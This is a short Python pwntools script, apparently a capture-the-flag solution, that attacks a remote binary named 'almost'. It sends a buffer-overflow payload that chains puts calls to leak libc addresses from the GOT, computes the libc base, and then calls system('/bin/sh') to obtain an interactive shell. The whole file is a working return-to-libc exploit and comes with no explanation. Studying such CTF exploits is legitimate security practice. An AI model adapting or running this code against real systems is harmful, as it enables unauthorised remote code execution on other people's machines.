#!/usr/bin/python3

from pwn import *

#p  = process('./almost')
p = remote("jh2i.com", 50017)
exe = ELF('./almost')
libc = ELF("./libc6-i386_2.27-3ubuntu1.2_amd64.so")

def send(protocol, domain, path, repeat=False):
    p.recvuntil(":\n")
    p.sendline(protocol)

    p.recvuntil(":\n")
    p.sendline(domain)

    p.recvuntil(':\n')
    p.sendline(path)
        
    """
    print(p.recvuntil('[y/n]\n'))
    if repeat:
        p.sendline('y')
    else:
        p.sendline('n')
    """



pause()
ret = 0x80486f4

#payload  = b'M'*8
#payload += b'AAAABBBBCCCCDDDDEEEEFFFFGGGG'

payload = b'M'*10
payload += p32(exe.plt['puts'])
payload += p32(exe.sym['main'])
payload += p32(exe.got['getchar'])
payload += b'Z'*(63 - len(payload))


send(b"A"*64, b'B'*64 , payload) 

p.recvline()
p.recvline()

getchar = u32(p.recv(4))
log.info('getchar @ 0x%x', getchar)

strcat = u32(p.recv(4))
log.info('strcat @ 0x%x', strcat)

puts = u32(p.recv(4))
log.info("puts @ 0x%x", puts)

libc_base = puts - libc.sym['puts']
log.success('Libc base @ 0x%x', libc_base)

payload2  = b'M'*10
payload2 += p32(libc_base + libc.sym['system'])
payload2 += b'MMMM'
payload2 += p32(libc_base + next(libc.search(b'/bin/sh')))
payload2 += b'Z'*(63 - len(payload2))


send(b'A'*64 , b'B'*64 , payload2)

p.interactive()



